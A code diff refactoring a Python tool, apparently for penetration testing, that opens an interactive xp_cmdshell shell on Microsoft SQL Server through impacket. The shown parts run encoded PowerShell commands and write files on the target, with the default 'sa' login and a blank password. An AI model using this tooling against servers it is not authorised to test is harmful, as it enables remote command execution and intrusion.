@@ -2,10 +2,11 @@
 # interactive xp_cmdshell
 # with impacket and cmd
 # used https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py for reference
-import os, cmd, sys, re, base64
+import base64
+import cmd
+
 from impacket import tds
-import readline
-import argparse
+
 
 class XpShell(cmd.Cmd):
 
@@ -16,10 +17,12 @@ class XpShell(cmd.Cmd):
         self.file = None
         self.pwsh = False
 
-    def powershell_encode(self, data):
+    @staticmethod
+    def powershell_encode(data):
         return base64.b64encode(data.encode('UTF-16LE')).decode()
 
-    def powershell_encode_binary(self, data):
+    @staticmethod
+    def powershell_encode_binary(data):
         return base64.b64encode(data).decode()
 
     # interpret every line as system command
@@ -57,11 +60,11 @@ exit                -   i wont say what it does
 
     def do_upload(self, data, dest):
         writeme = bytearray()  # contains bytes to be written
+        cmd = 'New-Item -Path {} -Force'.format(dest)
+        cmd = self.powershell_encode(cmd)
 
         try:
             # create/overwrite the target file with powershell
-            cmd = 'New-Item -Path {} -Force'.format(dest)
-            cmd = self.powershell_encode(cmd)
             self.execute_query('powershell -encodedCommand {}'.format(cmd))
         except FileNotFoundError as e:
             print('File not found.')
@@ -141,6 +144,7 @@ exit                -   i wont say what it does
         except ConnectionResetError as e:
             self.reconnect_mssql()
 
+
 def connect_mssql(ip, port=1433, username="sa", password="", domain=""):
     # do database connection (simple for now)
     ms_sql = tds.MSSQL(ip, port)
@@ -151,6 +155,7 @@ def connect_mssql(ip, port=1433, username="sa", password="", domain=""):
         return XpShell(ms_sql)
     else:
         return res
+
 
 if __name__ == '__main__':
     # pass commands directly into powershell
